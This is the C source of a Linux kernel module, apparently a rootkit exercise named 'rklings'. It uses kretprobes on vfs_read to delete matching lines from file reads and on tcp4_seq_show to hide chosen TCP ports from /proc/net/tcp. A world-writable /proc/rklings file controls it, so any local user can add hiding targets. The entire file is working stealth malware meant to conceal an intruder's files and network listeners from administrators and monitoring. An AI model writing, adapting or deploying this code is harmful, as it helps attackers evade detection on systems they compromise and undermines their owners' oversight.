// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>

#include "target_list.h"

#define RK_BUF_MAX 4080
#define RK_CMD_MAX 128

static struct rk_target_list content_targets;
static struct rk_target_list port_targets;
static struct proc_dir_entry *proc_entry;

/* --- vfs_read content hiding --- */

struct rk_read_data {
	char __user *buffer;
	unsigned char scratch[RK_BUF_MAX];
};

static size_t rk_remove_matching_lines(unsigned char *buf, size_t length)
{
	size_t read_pos = 0;
	size_t write_pos = 0;

	while (read_pos < length) {
		const unsigned char *line = buf + read_pos;
		const unsigned char *nl = memchr(line, '\n',
						 length - read_pos);
		size_t line_len = nl ? (size_t)(nl - line + 1)
				     : (length - read_pos);

		if (!rk_target_match(&content_targets,
				     (const char *)line, line_len)) {
			if (write_pos != read_pos)
				memmove(buf + write_pos, line, line_len);
			write_pos += line_len;
		}
		read_pos += line_len;
	}
	return write_pos;
}

static int rk_read_entry(struct kretprobe_instance *inst,
			  struct pt_regs *regs)
{
	struct rk_read_data *data = (void *)inst->data;

	data->buffer = (char __user *)regs_get_kernel_argument(regs, 1);
	return 0;
}

static int rk_read_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_read_data *data = (void *)inst->data;
	long result = (long)regs_return_value(regs);
	size_t new_len;

	if (result <= 0 || result > RK_BUF_MAX)
		return 0;
	if (!content_targets.count)
		return 0;
	if (copy_from_user_nofault(data->scratch, data->buffer, result) != 0)
		return 0;

	new_len = rk_remove_matching_lines(data->scratch, (size_t)result);
	if (new_len == (size_t)result)
		return 0;
	if (new_len == 0) {
		regs_set_return_value(regs, 0);
		return 0;
	}
	if (copy_to_user_nofault(data->buffer, data->scratch, new_len) != 0)
		return 0;
	regs_set_return_value(regs, (unsigned long)new_len);
	return 0;
}

static struct kretprobe read_probe = {
	.kp.symbol_name = "vfs_read",
	.entry_handler = rk_read_entry,
	.handler = rk_read_return,
	.data_size = sizeof(struct rk_read_data),
	.maxactive = 32,
};

/* --- tcp4_seq_show port hiding --- */

struct rk_tcp_data {
	struct seq_file *seq;
	size_t prev_count;
};

static int rk_tcp_show_entry(struct kretprobe_instance *inst,
			     struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;
	struct seq_file *seq = (struct seq_file *)regs->di;
	void *v = (void *)regs->si;
	struct sock *sk;
	struct inet_sock *inet;

	data->seq = NULL;
	if (v == SEQ_START_TOKEN)
		return 0;
	if (!port_targets.count)
		return 0;
	sk = (struct sock *)v;
	inet = inet_sk(sk);
	if (rk_target_number_match(&port_targets, ntohs(inet->inet_sport))) {
		data->seq = seq;
		data->prev_count = seq->count;
	}
	return 0;
}

static int rk_tcp_show_return(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;

	if (data->seq)
		data->seq->count = data->prev_count;
	return 0;
}

static struct kretprobe tcp_probe = {
	.kp.symbol_name = "tcp4_seq_show",
	.entry_handler = rk_tcp_show_entry,
	.handler = rk_tcp_show_return,
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

/* --- /proc/rklings interface --- */

static int rk_show(struct seq_file *out, void *unused)
{
	unsigned long flags;
	unsigned int i;

	seq_puts(out, "content_targets:\n");
	spin_lock_irqsave(&content_targets.lock, flags);
	for (i = 0; i < content_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, content_targets.entries[i]);
	spin_unlock_irqrestore(&content_targets.lock, flags);

	seq_puts(out, "port_targets:\n");
	spin_lock_irqsave(&port_targets.lock, flags);
	for (i = 0; i < port_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
	spin_unlock_irqrestore(&port_targets.lock, flags);
	return 0;
}

static int rk_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

static ssize_t rk_write(struct file *file, const char __user *ubuf,
			 size_t count, loff_t *off)
{
	char buf[RK_CMD_MAX];
	size_t len;
	unsigned int idx;

	(void)file;
	if (*off != 0)
		return -EINVAL;
	if (count >= sizeof(buf))
		return -E2BIG;
	if (copy_from_user(buf, ubuf, count))
		return -EFAULT;
	buf[count] = '\0';
	len = count;
	if (len > 0 && buf[len - 1] == '\n')
		buf[--len] = '\0';

	if (strncmp(buf, "hide content ", 13) == 0) {
		int rc = rk_target_add(&content_targets, buf + 13);
		return rc < 0 ? rc : (ssize_t)count;
	}
	if (strncmp(buf, "hide port ", 10) == 0) {
		int rc = rk_target_add(&port_targets, buf + 10);
		return rc < 0 ? rc : (ssize_t)count;
	}
	if (strncmp(buf, "unhide content ", 15) == 0) {
		if (kstrtouint(buf + 15, 10, &idx) != 0)
			return -EINVAL;
		return rk_target_remove(&content_targets, idx, NULL, 0) ?:
		       (ssize_t)count;
	}
	if (strncmp(buf, "unhide port ", 12) == 0) {
		if (kstrtouint(buf + 12, 10, &idx) != 0)
			return -EINVAL;
		return rk_target_remove(&port_targets, idx, NULL, 0) ?:
		       (ssize_t)count;
	}
	return -EINVAL;
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_open,
	.proc_read = seq_read,
	.proc_write = rk_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

/* --- init/exit --- */

static int __init rk_init(void)
{
	int error;

	rk_target_list_init(&content_targets);
	rk_target_list_init(&port_targets);

	error = register_kretprobe(&read_probe);
	if (error)
		return error;

	error = register_kretprobe(&tcp_probe);
	if (error)
		goto unregister_read;

	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry) {
		error = -ENOMEM;
		goto unregister_tcp;
	}
	return 0;

unregister_tcp:
	unregister_kretprobe(&tcp_probe);
unregister_read:
	unregister_kretprobe(&read_probe);
	return error;
}

static void __exit rk_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&tcp_probe);
	unregister_kretprobe(&read_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings content and port hiding");
